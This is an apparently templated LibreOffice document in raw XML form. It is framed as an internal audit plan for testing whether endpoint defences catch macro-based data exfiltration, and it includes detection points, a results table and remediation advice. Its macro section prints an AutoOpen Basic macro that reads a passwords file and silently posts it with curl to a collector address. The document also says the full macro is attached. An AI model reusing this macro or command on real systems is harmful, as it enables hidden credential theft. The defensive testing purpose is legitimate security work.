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Courier New',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1.7306in"/>
    </style:style>
    <style:style style:name="Table1.B" style:family="table-column">
      <style:table-column-properties style:column-width="2.8854in"/>
    </style:style>
    <style:style style:name="Table1.C" style:family="table-column">
      <style:table-column-properties style:column-width="2.4708in"/>
    </style:style>
    <style:style style:name="Table1.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.0194in" fo:border="none"/>
    </style:style>
    <style:style style:name="Table2" style:family="table">
      <style:table-properties style:width="8.2882in" table:align="left"/>
    </style:style>
    <style:style style:name="Table2.A" style:family="table-column">
      <style:table-column-properties style:column-width="1.4549in"/>
    </style:style>
    <style:style style:name="Table2.B" style:family="table-column">
      <style:table-column-properties style:column-width="2.2674in"/>
    </style:style>
    <style:style style:name="Table2.D" style:family="table-column">
      <style:table-column-properties style:column-width="2.2986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Preformatted_20_Text">
      <style:paragraph-properties fo:margin-left="0.8984in" fo:margin-right="0.8984in" fo:margin-top="0.111in" fo:margin-bottom="0.111in" style:contextual-spacing="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="10pt" fo:background-color="#ecf0f1" loext:padding-left="0.1665in" loext:padding-right="0.1665in" loext:padding-top="0.111in" loext:padding-bottom="0.111in" loext:border="0.06pt solid #bdc3c7"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-left="0.8984in" fo:margin-right="0.8984in" fo:margin-top="0.111in" fo:margin-bottom="0.111in" style:contextual-spacing="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:background-color="#ecf0f1" loext:padding-left="0.1665in" loext:padding-right="0.1665in" loext:padding-top="0.111in" loext:padding-bottom="0.111in" loext:border="0.06pt solid #bdc3c7"/>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paragraph-properties fo:margin-left="0.111in" fo:margin-right="0.111in" fo:text-indent="0in" style:auto-text-indent="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3">
      <style:paragraph-properties fo:margin-left="0.111in" fo:margin-right="0.111in" fo:margin-top="0.111in" fo:margin-bottom="0.111in" style:contextual-spacing="false" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.1665in" fo:margin-right="0.1665in" fo:margin-top="0.1665in" fo:margin-bottom="0.1665in" style:contextual-spacing="false" fo:text-indent="0in" style:auto-text-indent="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paragraph-properties fo:margin-top="0.4165in" fo:margin-bottom="0.139in" style:contextual-spacing="false"/>
      <style:text-properties fo:color="#7f8c8d" loext:opacity="100%" fo:font-size="9pt" loext:padding-left="0in" loext:padding-right="0in" loext:padding-top="0.111in" loext:padding-bottom="0in" loext:border-left="none" loext:border-right="none" loext:border-top="0.06pt solid #d5d8dc" loext:border-bottom="none"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="10pt" fo:background-color="#ecf0f1" loext:char-shading-value="0" loext:padding-left="0.1665in" loext:padding-right="0.1665in" loext:padding-top="0.111in" loext:padding-bottom="0.111in" loext:border="0.06pt solid #bdc3c7"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-weight="bold" fo:background-color="#fdedec" loext:char-shading-value="0" loext:padding-left="0.1945in" loext:padding-right="0in" loext:padding-top="0in" loext:padding-bottom="0in" loext:border-left="3pt solid #e74c3c" loext:border-right="none" loext:border-top="none" loext:border-bottom="none"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-style="italic" fo:background-color="#fef9e7" loext:char-shading-value="0" loext:padding-left="0.1945in" loext:padding-right="0in" loext:padding-top="0in" loext:padding-bottom="0in" loext:border-left="3pt solid #f39c12" loext:border-right="none" loext:border-top="none" loext:border-bottom="none"/>
    </style:style>
    <style:style style:name="T5" style:family="text"/>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 Security Audit – Macro-Based Exfiltration Test</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Document ID:</text:span> AUD-{PLACEHOLDER_DATE}-{PLACEHOLDER_INITIALS}</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Classification:</text:span> Internal – Security Audit</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Prepared by:</text:span> {PLACEHOLDER_AUDITOR_NAME}, Senior Security Engineer</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Reviewer:</text:span> {PLACEHOLDER_REVIEWER_NAME}</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">1. Purpose and Scope</text:h>
      <text:p text:style-name="Text_20_body">This document is part of a <text:span text:style-name="Strong_20_Emphasis">controlled security evaluation</text:span> to assess the effectiveness of our endpoint detection and response (EDR) systems against macro-based data exfiltration techniques. The test simulates a common attack vector where an attacker embeds malicious macros in a seemingly benign document to steal sensitive files from a compromised workstation.</text:p>
      <text:p text:style-name="Text_20_body">The primary objective is to verify whether our current security controls (antivirus, application whitelisting, network monitoring) can detect and block an <text:span text:style-name="Strong_20_Emphasis">AutoOpen macro</text:span> that executes a shell command to exfiltrate the contents of a local file to a remote server. This test is conducted under the supervision of the <text:span text:style-name="Strong_20_Emphasis">Security Operations Center (SOC)</text:span> and has been approved by {PLACEHOLDER_APPROVER_NAME}.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">2. Test Configuration</text:h>
      <text:p text:style-name="Text_20_body">The following parameters define the test environment and the expected behavior of the macro script. All IP addresses and file paths used in this test are part of a <text:span text:style-name="Strong_20_Emphasis">sandboxed lab network</text:span> (VLAN {PLACEHOLDER_VLAN_ID}) and do not affect production system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Value</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Heading">Notes</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Target File (Source)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Source_20_Text">C:\passwords.txt</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Synthetic file containing test credentials (non-production)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Remote Server IP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Source_20_Text">192.168.1.100</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Internal audit collector – port 8080</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Protocol</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">HTTP POST (raw data)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Simulated using <text:span text:style-name="Source_20_Text">curl</text:span> or <text:span text:style-name="Source_20_Text">certutil</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Macro Event</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Source_20_Text">AutoOpen</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Triggers upon document opening (LibreOffice Basic)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Operating System</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Windows 10 Enterprise (Build {PLACEHOLDER_OS_BUILD})</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Test VM isolated from domain</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Office Suite</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">LibreOffice 7.x (Fresh)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Macro security set to Medium for this test</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">3. Macro Implementation Details</text:h>
      <text:p text:style-name="Text_20_body">The macro script is written in <text:span text:style-name="Strong_20_Emphasis">LibreOffice Basic</text:span> and is attached to the document's <text:span text:style-name="Source_20_Text">AutoOpen</text:span> event. The script performs the following steps in sequence:</text:p>
      <text:list xml:id="list1520846631" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="Strong_20_Emphasis">Read the target file</text:span> (<text:span text:style-name="Source_20_Text">C:\passwords.txt</text:span>) using the <text:span text:style-name="Source_20_Text">FileInputStream</text:span> object. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="Strong_20_Emphasis">Encode the contents</text:span> in base64 to avoid character encoding issues during HTTP transmission. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="Strong_20_Emphasis">Execute a shell command</text:span> via <text:span text:style-name="Source_20_Text">Shell()</text:span> that uses <text:span text:style-name="Source_20_Text">curl</text:span> to POST the encoded data to <text:span text:style-name="Source_20_Text">http://192.168.1.100:8080/exfil</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="Strong_20_Emphasis">Clean up</text:span> temporary variables and suppress error messages to avoid user suspicion. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2">Sub AutoOpen()</text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">Dim fileNum As Integer</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">Dim fileContent As String</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">Dim encodedContent As String</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">Dim shellCmd As String</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">fileNum = FreeFile</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">Open "C:\passwords.txt" For Input As fileNum</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">fileContent = Input(LOF(fileNum), fileNum)</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">Close fileNum</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">' Base64 encode using helper function</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">encodedContent = EncodeBase64(fileContent)</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">' Build shell command</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">shellCmd = "curl -X POST --data """ &amp; encodedContent &amp; """ http://192.168.1.100:8080/exfil"</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">' Execute (suppress window)</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="4"/><text:span text:style-name="T1">Shell(shellCmd, 0)</text:span></text:p>
      <text:p text:style-name="P2">End Sub</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Emphasis">Note: The base64 encoding function is omitted for brevity but is included in the full macro attached to this document.</text:span></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">4. Expected Detection Points</text:h>
      <text:p text:style-name="Text_20_body">The following security controls are expected to generate alerts during this test. The SOC team will monitor each layer and record findings in the table below.</text:p>
      <text:list xml:id="list3015310678" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="Strong_20_Emphasis">Host-based Firewall:</text:span> Outbound connection to 192.168.1.100:8080 from <text:span text:style-name="Source_20_Text">soffice.bin</text:span> process. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="Strong_20_Emphasis">EDR (Endpoint Detection &amp; Response):</text:span> Process creation event for <text:span text:style-name="Source_20_Text">curl.exe</text:span> or <text:span text:style-name="Source_20_Text">cmd.exe</text:span> spawned by LibreOffice. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="Strong_20_Emphasis">File Access Monitoring:</text:span> Read attempt on <text:span text:style-name="Source_20_Text">C:\passwords.txt</text:span> by a macro-enabled process. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="Strong_20_Emphasis">Network IDS/IPS:</text:span> HTTP POST request containing base64-encoded credential-like data to an internal IP. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis">Application Control:</text:span> Execution of <text:span text:style-name="Source_20_Text">curl</text:span> from a non-standard parent process (LibreOffice). </text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">5. Test Execution Steps</text:h>
      <text:p text:style-name="Text_20_body">To execute this test, the auditor must perform the following actions in order:</text:p>
      <text:list xml:id="list3692699223" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P10">Ensure the test VM is powered on and connected to the isolated audit VLAN. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">Place the synthetic <text:span text:style-name="Source_20_Text">passwords.txt</text:span> file in <text:span text:style-name="Source_20_Text">C:\</text:span> with the following content: <text:span text:style-name="T2">username=test_admin, password=S3cur3P@ss!2024</text:span> </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P10">Open this document (<text:span text:style-name="Source_20_Text">audit_exfil_test.odt</text:span>) in LibreOffice Writer. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P10">If macro security prompts appear, click <text:span text:style-name="Strong_20_Emphasis">Enable Macros</text:span> (this is expected for the test). </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P10">The <text:span text:style-name="Strong_20_Emphasis">AutoOpen</text:span> macro will execute automatically. Verify that the SOC dashboard shows the alert within 60 seconds. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9">Document the alert timestamp, severity, and any false positive flags in the results table below. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P12"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T3">IMPORTANT:</text:span></text:span><text:span text:style-name="T3"> This test must only be run in the designated sandbox environment. Do not open this document on any production workstation or network segment. The macro is designed to exfiltrate data to a controlled collector. Unauthorized execution may trigger real security incidents. </text:span></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">6. Results Recording Table</text:h>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Table_20_Heading">Control Layer</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Heading">Alert Generated? (Yes/No)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Heading">Timestamp</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Heading">Comments</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Host Firewall</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_RESULT_FW}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_TIME_FW}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_COMMENT_FW}</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">EDR (Process Tree)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_RESULT_EDR}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_TIME_EDR}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_COMMENT_EDR}</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">File Access Monitor</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_RESULT_FILE}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_TIME_FILE}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_COMMENT_FILE}</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Network IDS</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_RESULT_NET}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_TIME_NET}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_COMMENT_NET}</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">App Control</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_RESULT_APP}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_TIME_APP}</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">{PLACEHOLDER_COMMENT_APP}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">7. Remediation Recommendations</text:h>
      <text:p text:style-name="Text_20_body">Based on the test outcomes, the following actions are recommended to improve our security posture against macro-based exfiltration:</text:p>
      <text:list xml:id="list1039182701" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis">If alerts were missed:</text:span> Update EDR rules to monitor for <text:span text:style-name="Source_20_Text">Shell()</text:span> calls from LibreOffice and OpenOffice processes, particularly those involving <text:span text:style-name="Source_20_Text">curl</text:span>, <text:span text:style-name="Source_20_Text">certutil</text:span>, or <text:span text:style-name="Source_20_Text">powershell</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis">If alerts were generated but delayed:</text:span> Tune detection thresholds and reduce polling intervals for file access events. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis">General hardening:</text:span> Enforce macro security settings via Group Policy to disable macros from untrusted sources, and implement application whitelisting for document processors. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13"><text:span text:style-name="Strong_20_Emphasis">User awareness:</text:span> Conduct training on the risks of enabling macros in documents from unknown or unexpected sources. </text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">8. Conclusion</text:h>
      <text:p text:style-name="Text_20_body">This controlled test will provide valuable insight into the effectiveness of our layered security controls against a realistic macro-based exfiltration scenario. The results will be used to prioritize improvements in our detection and response capabilities. The final report, including all findings and remediation steps, will be submitted to {PLACEHOLDER_MANAGER_NAME} by {PLACEHOLDER_REPORT_DEADLINE}.</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T4">Document Status:</text:span></text:span><text:span text:style-name="T4"> Draft – Pending execution and review. This document is not to be distributed outside the security audit team without explicit authorization. </text:span></text:p>
      <text:p text:style-name="P15">Security Audit Division – {PLACEHOLDER_COMPANY_NAME}<text:line-break/>Document generated on {PLACEHOLDER_GENERATION_DATE} | Version 1.0<text:line-break/>Template: AUD-MACRO-EXFIL-202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Courier New',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1a1a1a"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3335in" fo:margin-bottom="0.1965in" style:contextual-spacing="false" fo:padding-left="0in" fo:padding-right="0in" fo:padding-top="0in" fo:padding-bottom="0.0626in" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="1.5pt solid #3498db"/>
      <style:text-properties fo:color="#2c3e50" loext:opacity="100%" style:font-name="Liberation Sans1" fo:font-family="'Liberation Sans', Arial, sans-serif" fo:font-size="18pt" fo:font-weight="bold" style:font-name-asian="Liberation Sans1" style:font-family-asian="'Liberation Sans', Arial, sans-serif" style:font-size-asian="18pt" style:font-weight-asian="bold" style:font-name-complex="Liberation Sans1" style:font-family-complex="'Liberation Sans', Arial, sans-serif"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39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0835in" style:contextual-spacing="false"/>
      <style:text-properties fo:color="#34495e" loext:opacity="100%" style:font-name="Liberation Sans1" fo:font-family="'Liberation Sans', Arial, sans-serif" fo:font-size="14pt" fo:font-weight="bold" style:font-name-asian="Liberation Sans1" style:font-family-asian="'Liberation Sans', Arial, sans-serif" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="Liberation Sans1" style:font-family-complex="'Liberation Sans', Arial, sans-serif"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835in" style:contextual-spacing="false"/>
      <style:text-properties fo:color="#555555" loext:opacity="100%" style:font-name="Liberation Sans1" fo:font-family="'Liberation Sans', Arial, sans-serif" fo:font-size="12pt" fo:font-weight="bold" style:font-name-asian="Liberation Sans1" style:font-family-asian="'Liberation Sans', Arial, sans-serif" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-name-complex="Liberation Sans1" style:font-family-complex="'Liberation Sans', Arial, sans-serif" style:font-size-complex="12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Preformatted_20_Text" style:display-name="Preformatted Text" style:family="paragraph" style:parent-style-name="Standard" style:class="html">
      <style:paragraph-properties fo:margin-top="0.7874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1" meta:paragraph-count="109" meta:word-count="884" meta:character-count="6586" meta:non-whitespace-character-count="5729"/>
    <meta:generator>LibreOffice/7.3.7.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
    <meta:user-defined meta:name=""/>
  </office:meta>
</office:document-meta>
</file>